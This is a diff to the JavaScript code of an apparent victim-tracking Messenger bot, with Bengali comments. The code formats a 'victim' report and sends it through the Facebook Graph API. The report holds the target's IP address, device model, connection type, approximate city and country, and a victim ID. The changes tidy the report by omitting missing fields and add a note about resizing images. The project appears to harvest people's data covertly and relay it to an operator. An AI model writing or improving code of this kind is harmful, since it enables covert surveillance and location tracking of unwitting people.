@@ -141,7 +141,7 @@ async function sendImageMessage(recipientId, imageUrl) {
 }
 
 // ================================================================
-// 🆕 Base64 দিয়ে সরাসরি ইমেজ পাঠানো (URL কাজ না করলে ব্যাকআপ)
+// 🔥 Base64 দিয়ে সরাসরি ইমেজ পাঠানো (ছোট সাইজের জন্য)
 // ================================================================
 async function sendImageMessageBase64(recipientId, base64Image) {
     try {
@@ -152,6 +152,8 @@ async function sendImageMessageBase64(recipientId, base64Image) {
             return { success: false, error: 'TOKEN_MISSING' };
         }
 
+        // 🔥 Base64 ডেটা খুব বড় হলে Facebook API 400 Error দেয়
+        // তাই আমরা আগে থেকে রিসাইজ করে পাঠাচ্ছি (routes/victim.js-এ)
         const response = await axios.post(
             `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
             {
@@ -260,14 +262,18 @@ function getBangladeshTime() {
 }
 
 // ================================================================
-// ভিক্টিম ডেটা ফরম্যাট (বাংলাদেশ সময় সহ)
+// 🔥 ভিক্টিম ডেটা ফরম্যাট (IP ও লোকেশন N/A থাকলে লাইন বাদ)
 // ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
     const deviceTime = getBangladeshTime();
     
     let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
-    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
+    
+    // 🔥 IP শুধু থাকলেই দেখান
+    if (victim.ip && victim.ip !== '0.0.0.0' && victim.ip !== 'N/A') {
+        msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip}\n`;
+    }
     msg += `🕐 *সময়:* ${deviceTime}\n\n`;
     
     const model = getDeviceModel(d);
@@ -286,10 +292,9 @@ function formatVictimData(victim) {
     const connectionType = n.type || 'N/A';
     msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
     
-    if (victim.location && victim.location.city) {
+    // 🔥 লোকেশন শুধু থাকলেই দেখান
+    if (victim.location && victim.location.city && victim.location.city !== 'N/A') {
         msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
-    } else {
-        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
     }
     
     msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
